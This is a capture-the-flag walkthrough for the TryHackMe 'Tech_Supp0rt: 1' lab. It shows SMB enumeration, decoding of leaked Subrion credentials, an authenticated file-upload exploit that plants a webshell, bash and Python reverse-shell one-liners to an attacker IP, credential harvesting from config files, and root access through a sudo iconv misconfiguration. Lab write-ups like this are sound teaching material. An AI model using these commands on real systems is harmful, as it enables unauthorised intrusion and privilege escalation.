# Tech_Supp0rt: 1

Hack into the scammer's under-development website to foil their plans.

Hack into the machine and investigate the target.

Please allow about 5 minutes for the machine to fully boot!

Note: The theme and security warnings encountered in this room are part of the challenge.

Room: https://tryhackme.com/room/techsupp0rt1

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: https://github.com/garthheff/CTF-Hints/blob/main/techsupp0rt1.md

------------------


## Overview

This room started with basic service enumeration and quickly led to an anonymous SMB share. The share contained a note with encoded Subrion CMS credentials. After decoding the password with CyberChef, I logged into the Subrion admin panel and exploited an authenticated arbitrary file upload vulnerability to gain command execution as `www-data`.

From there, I searched web application config files and found WordPress database credentials. The WordPress password was reused by the local `scamsite` user. Finally, `sudo -l` showed that `scamsite` could run `iconv` as root without a password, which was abused to gain root access.

---

## Enumeration

I started with a full TCP scan using Nmap.

```bash
sudo nmap -sV -sC -p- --min-rate 5000 -oN nmap-sv-all.txt 10.64.180.201
```

The scan found four open ports:

```text
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  netbios-ssn
```

The important findings were:

```text
22/tcp  OpenSSH 7.2p2 Ubuntu
80/tcp  Apache httpd 2.4.18
139/tcp Samba
445/tcp Samba 4.3.11-Ubuntu
```

The hostname was also shown as:

```text
TECHSUPPORT
```

Because SMB was open and Nmap showed guest access was being used, I checked for anonymous shares first.

---

## SMB Enumeration

I listed SMB shares without credentials.

```bash
smbclient -L //10.64.180.201 -N
```

This showed an interesting share:

```text
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
websvr          Disk
IPC$            IPC       IPC Service
```

I connected to the `websvr` share anonymously.

```bash
smbclient //10.64.180.201/websvr -N
```

Inside the share, I found one file.

```text
smb: \> ls
  enter.txt
```

I downloaded it.

```text
smb: \> get enter.txt
```

Then read it locally.

```bash
cat enter.txt
```

The note contained some goals and credentials.

```text
GOALS
=====
1)Make fake popup and host it online on Digital Ocean server
2)Fix subrion site, /subrion doesn't work, edit from panel
3)Edit wordpress website

IMP
===
Subrion creds
|->admin:7sKv...KWCk [cooked with magical formula]
Wordpress creds
|->
```

The important part was the Subrion credential clue:

```text
admin:7sKv...KWCk [cooked with magical formula]
```

The phrase `cooked with magical formula` strongly suggested CyberChef Magic.

---

## Decoding the Subrion Password

I pasted the encoded password into CyberChef and used the **Magic** recipe.

CyberChef decoded it using:

```text
From Base58
From Base32
From Base64
```

The decoded password was:

```text
Scam...2021
```

So the Subrion credentials were:

```text
admin:Scam...2021
```

---

## Accessing the Subrion Panel

The note said:

```text
/subrion doesn't work, edit from panel
```

When I browsed to:

```text
http://10.64.180.201/subrion/
```

it redirected to:

```text
https://10.0.2.15/subrion/subrion/
```

This failed because `10.0.2.15` was not reachable from my network.

However, the admin panel worked directly:

```text
http://10.64.180.201/subrion/panel/
```

I logged in using:

```text
admin:Scam...2021
```

This confirmed the decoded password was valid.

---

## Finding the Subrion Exploit

I checked SearchSploit for Subrion exploits.

```bash
searchsploit subrion
```

Relevant results included:

```text
Subrion CMS 4.2.1 - Arbitrary File Upload | php/webapps/49876.py
```

Since I had valid admin credentials, the authenticated arbitrary file upload exploit looked like the intended path.

I copied the exploit locally.

```bash
searchsploit -m php/webapps/49876.py
```

Then ran it against the Subrion panel.

```bash
python3 49876.py -u http://10.64.180.201/subrion/panel/ -l admin -p 'Scam...2021'
```

The exploit successfully logged in, generated a webshell name, and uploaded a `.phar` shell.

```text
[+] Login Successful!
[+] Upload Success... Webshell path: http://10.64.180.201/subrion/panel/uploads/seolwfoscwyppsw.phar
```

The exploit gave a command shell.

```text
$ whoami
www-data
```

At this point, I had command execution as `www-data`.

---

## Getting a Reverse Shell

I first tried a standard bash reverse shell.

```bash
bash -c 'bash -i >& /dev/tcp/10.64.90.63/4444 0>&1'
```

This did not work from the exploit shell.

I started a listener on my AttackBox.

```bash
nc -lvnp 4444
```

Then I used a Python reverse shell instead, which worked.

```bash
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("10.64.90.63",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

The listener caught the shell.

```text
Connection received on 10.64.180.201
www-data@TechSupport:/var/www/html/subrion/uploads$
```

I upgraded the shell.

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```

---

## Enumerating as www-data

I checked the home directory.

```bash
cd /home
ls
```

There was one real user.

```text
scamsite
```

I checked `/etc/passwd`.

```bash
cat /etc/passwd
```

The useful user was:

```text
scamsite:x:1000:1000:scammer,,,:/home/scamsite:/bin/bash
```

I then looked for web application configuration files.

The Subrion config contained database credentials.

```php
define('INTELLI_DBUSER', 'subrionuser');
define('INTELLI_DBPASS', 'Tech...Story');
define('INTELLI_DBNAME', 'subrion');
```

I tried password reuse with the `scamsite` account.

```bash
su scamsite
```

The Subrion database password did not work.

```text
su: Authentication failure
```

So I continued looking for other credentials.

---

## Finding WordPress Credentials

The SMB note also mentioned WordPress, so I searched for the WordPress config.

```bash
find /var/www -name wp-config.php 2>/dev/null
```

Inside `wp-config.php`, I found database credentials.

```php
define( 'DB_USER', 'support' );
define( 'DB_PASSWORD', 'ImAS...123!' );
define( 'DB_HOST', 'localhost' );
```

This password looked like a better candidate for reuse.

I tried switching to the `scamsite` user.

```bash
su scamsite
```

Password:

```text
ImAS...123!
```

This worked.

```text
scamsite@TechSupport:/home$ whoami
scamsite
```

I confirmed the user context.

```bash
id
```

```text
uid=1000(scamsite) gid=1000(scamsite) groups=1000(scamsite),113(sambashare)
```

---

## Privilege Escalation Enumeration

As `scamsite`, I checked sudo permissions.

```bash
sudo -l
```

The result showed:

```text
User scamsite may run the following commands on TechSupport:
    (ALL) NOPASSWD: /usr/bin/iconv
```

This was the privilege escalation path.

`iconv` can read from input files and write to output files. Because it could be run as root with no password, it could be abused to read root-owned files or write files as root.

The simple flag-read method would be:

```bash
sudo /usr/bin/iconv -f 8859_1 -t 8859_1 /root/root.txt
```

I used it to go further and get a full root shell by writing a sudoers drop-in.

---

## Getting Root with iconv

I created a sudoers entry in `/tmp`.

```bash
echo 'scamsite ALL=(ALL) NOPASSWD:ALL' > /tmp/scamsite
```

Then used `iconv` with sudo to write it into `/etc/sudoers.d/`.

```bash
sudo /usr/bin/iconv -f 8859_1 -t 8859_1 /tmp/scamsite -o /etc/sudoers.d/scamsite
```

After that, I switched to root.

```bash
sudo -i
```

This worked.

```text
root@TechSupport:~#
```

---

## Root Flag

I moved to `/root` and listed the files.

```bash
cd /root
ls
```

```text
root.txt
```

I accidentally typoed the filename first.

```bash
cat root.xt
```

Then read the correct file.

```bash
cat root.txt
```

Root flag:

```text
851b...790b
```

---

## Attack Path Summary

```text
Nmap found SSH, HTTP, and SMB
Anonymous SMB access exposed the websvr share
websvr contained enter.txt
enter.txt leaked encoded Subrion admin credentials
CyberChef Magic decoded the password
/subrion redirected to the wrong internal IP
/subrion/panel/ worked
Logged into Subrion as admin
Subrion CMS 4.2.1 arbitrary file upload gave RCE as www-data
Bash reverse shell failed
Python reverse shell worked
Subrion config exposed DB creds, but password reuse failed
WordPress wp-config.php exposed another password
WordPress DB password was reused by scamsite
sudo -l showed NOPASSWD iconv
iconv was abused to write a sudoers drop-in
sudo -i gave root
```

---

## Key Takeaways

* Always check SMB null sessions when ports `139` and `445` are open.
* Notes found in shares often point directly to the intended path.
* CyberChef Magic is useful when a challenge says something was “cooked”.
* Broken redirects can sometimes be bypassed by accessing the admin panel directly.
* Authenticated CMS access is often enough for code execution.
* Web config files are high-value post-exploitation targets.
* Password reuse between web apps, databases, and system users is common in CTFs.
* `sudo -l` should always be checked after gaining a real user.
* GTFOBins-style binaries like `iconv` can often read or write privileged files when run through sudo.
